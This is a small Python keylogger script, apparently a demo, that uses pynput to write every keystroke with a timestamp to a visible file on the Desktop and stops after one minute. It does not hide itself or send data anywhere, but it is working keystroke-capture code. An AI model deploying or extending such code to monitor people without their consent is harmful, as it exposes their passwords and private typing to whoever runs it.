import os
import threading
from pynput import keyboard
from datetime import datetime, timedelta

desktop = os.path.join(os.path.expanduser("~"), "Desktop", "ваши_действия.txt")
end_time = None  

def on_press(key):
    global end_time  
    try:
        with open(desktop, "a") as file:
            file.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(desktop, "a") as file:
            file.write(f"{datetime.now()} - {key}\n")

def stop_listener():
    global end_time
    end_time = datetime.now() + timedelta(minutes=1)
    
    while True:
        if datetime.now() >= end_time:
            listener.stop()
            break

# Запускаем поток для остановки слушателя через 1 минуту
threading.Thread(target=stop_listener, daemon=True).start()

# Запускаем слушатель клавиатуры
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
